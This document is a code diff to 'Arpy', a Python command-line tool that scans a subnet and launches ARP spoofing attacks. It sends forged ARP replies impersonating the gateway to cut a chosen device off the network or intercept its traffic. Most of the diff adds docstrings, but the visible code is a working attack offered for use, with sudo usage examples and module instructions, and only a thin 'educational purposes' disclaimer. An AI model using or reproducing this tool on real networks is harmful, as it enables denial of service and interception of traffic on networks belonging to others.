@@ -15,23 +15,24 @@ import queue
 
 
 class Arpy:
-    LOGO1 = """
-             _____  
-     /\     |  __ \ 
-    /  \    | |__) |
-   / /\ \   |  _  / 
-  / ____ \  | | \ \ 
- /_/    \_\ |_|  \_\\"""
-    LOGO2 = """
-  _____   __     __
- |  __ \  \ \   / /
- | |__) |  \ \_/ / 
- |  ___/    \   /  
- | |         | |   
- |_|         |_|   
-                """
-    MSG = "This is the command line interface for Arpy, please do not use this for malicious purposes, this is purely for educational purpose"
+    """Objects of this class contain methods which can launch an ARP spoofing attack. This particular script was is not meant
+       to be modified, it should be interacted from the command line, you are welcome to read it so as to gain bettter understading of the 
+       underlying features
+    """
 
+    LOGO ="""
+             _____    _____   __     __
+     /\     |  __ \  |  __ \  \ \   / /
+    /  \    | |__) | | |__) |  \ \_/ / 
+   / /\ \   |  _  /  |  ___/    \   /  
+  / ____ \  | | \ \  | |         | |   
+ /_/    \_\ |_|  \_\ |_|         |_|   
+                                       
+                                       
+""" 
+    MSG = "This is the command line interface for Arpy, please do not use this for malicious intent, this is purely for educational purposes"
+    
+    #Variables that should not be altered
     __INTERVAL = 3
     __IP_QUEUE = queue.Queue()
     __LOCAL_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1])
@@ -41,6 +42,15 @@ class Arpy:
     __THREADS = list()
     
     def __init__(self, subnet:str, gateway:str, mac:str = __LOCAL_MAC, interval:int = __INTERVAL,two_way_flag:bool = False):
+        """This method initialises the object and validates the object attributes
+           
+           :param subnet: Network address, e.g 192.168.1.0/24
+           :param gateway: IP address of gateway
+           :param mac: MAC address of attacker, this can be changed using the setter method set_mac(), see below
+           :param interval: interval in seconds between gratuitous ARP reply to target/s
+           :param two_way_flag: A bolean value which decides whether the ARP spoofing attacking in two way or on way
+        """
+
         self.__MAC = mac 
         self.subnet = subnet
         self.gateway = gateway
@@ -61,7 +71,9 @@ class Arpy:
         self.__UI()
     
     def __check_obj_attribute(self):
-
+        """This method validates attributes of instances of this class, e.g correct types, valid IP addresses
+           
+        """
         try:
            
            private_subnet =  ip.IPv4Network(self.subnet).is_private
@@ -95,6 +107,14 @@ class Arpy:
 
         
     def __error(self, var:str , correct_type, err_name):
+        """This private method  throws exceptions when the user assigns an attribute of incorrect type
+           
+           :param var: The name of the variable which was wrongy assigned in strings, e.g "self.__INTERVAL"
+           :param correct_type: The type of data the user should have used, in this an arbitrary example of the type must be supplied, e.g 3 -> which is an int, False-> Which is a bool
+           :param err_name: The name of the exception to throw, e.g TypeError
+
+           usage: self.__error("self.__INTERVAL", 3, TypeError)
+        """
         variable_value = eval(var)
         error=err_name(f"{var}={variable_value}, is of type {type(variable_value)}, it should be of type {type(correct_type)}")
         raise error
@@ -102,7 +122,9 @@ class Arpy:
  
 
     def __UI(self):
-        print(self.LOGO1,colored(self.LOGO2, "green"))
+        """This method initialises the command line interface for the user
+        """
+        print(colored(self.LOGO, "green"))
         print(colored(self.MSG,"green"))
         print("[*] Object Attributes seems ok")
         
@@ -120,7 +142,12 @@ class Arpy:
         else:
            print("[*] Two way poisoning: Disabled") 
 
-    def __get_mac(self,target=None):
+    def __get_mac(self,target:str =None):
+        """This private method is invoked by get_mac
+          
+          :param target: IP addres of target, if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
+        """
+
         
         if target is None:
             while True:
@@ -153,7 +180,12 @@ class Arpy:
 
 
     
-    def get_mac(self,target=None,threads=5):
+    def get_mac(self,target:str =None,threads:int =5):
+        """This method is supposed to be accessed by the user, the latter spawns a specified number of threads to scan all the IP address on the network concurrently
+
+           :param target: The IP address of the target,  if target is None the method keeps taking an IP address from a Queue object until the Queue object is exhausted, i.e an exception is thrown as it is empty
+           :param threads: The number of threads to be spawned to scan the network concurrently, defaults to 5 
+        """
         
         if (type(threads) is float) or (type(threads) is int):
            threads = int(abs(threads))
@@ -174,10 +206,15 @@ class Arpy:
         else:
            self.__get_mac(target)
    
-    def set_mac(self,mac): 
-        self.__MAC = mac
+    def set_mac(self,mac:str): 
+        """setter methos which changes MAC address of attacker
+           param mac: MAC address to change to
+        """
+        self.__LOCAL_MAC = mac
 
     def shell(self):
+        """This method should be invoked by the user as it provides them with pseudo interactive shell to lauch the attack"""
+
         print("")
         for index,key in enumerate(self.__IP_TO_MAC):
             print("{} | {} -> {}".format(index,key,self.__IP_TO_MAC.get(key)))
@@ -201,7 +238,12 @@ class Arpy:
                except Exception as e:
                  exit(f"{e}")
 
-    def __inject_packet(self,uindex, interval):
+    def __inject_packet(self,uindex:int , interval:int):
+            """The method that actually lauches the attack and is invoked after the user selects the target
+           
+           :param uindex: Index of target, selected by the user
+           :interval: interval in seconds between gratuitous ARP reply to target/s
+            """
         
             try:
                  unsolicited_arp_rep_to_tgt = ARP(op=2,psrc=parse.gateway_ip, pdst=self.__INDEX_TO_IP.get(uindex), hwdst=self.__IP_TO_MAC.get(self.__INDEX_TO_IP.get(uindex)))
@@ -225,6 +267,7 @@ class Arpy:
 
 if __name__ == "__main__":
     
+    """The code below initialises parses command line arguement"""
     parser = argparse.ArgumentParser(formatter_class = argparse.RawTextHelpFormatter,description="This script shows how easily a malicious user can cause a Denial Of Service attack in a home network once he is connect to it. NOTE : This is for demonstration purposes only and will not work in an enterprise environment where security mechanisms such as dynamic ARP inspection(DAI) are enabled.\n\n To truly how this work I would recommed to use wireshark",epilog="Example:\n\tsudo python3 arp_dos.py -S 192.168.100.0/24 -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -T 192.168.100.112 -G 192.168.100.1\n\tsudo python3 arp_dos.py  -S 192.168.100.0/24 -G 192.168.100.1" )
     parser.add_argument("-S","--subnet",help="Network address of subnet e.g 192.168.100.0/24",metavar="subnet_ip", required=True, dest="subnet",type=str)
     parser.add_argument("-G","--gateway", help="IP address of default gateway",metavar="gateway_ip ",required=True,dest="gateway_ip")
@@ -234,7 +277,7 @@ if __name__ == "__main__":
     parser.add_argument("-2", help="enables 2 way poisoning, defaults to False",action="store_true", required=False, dest="twoway")
     parse = parser.parse_args()
  
-    
+    """The only 3 lines you will need if you decide to use this tool as a module in your project :)"""
     psn = Arpy(parse.subnet, parse.gateway_ip, interval = parse.interval,two_way_flag=parse.twoway)
     psn.get_mac(threads=parse.threads,target = parse.target)
     psn.shell()   
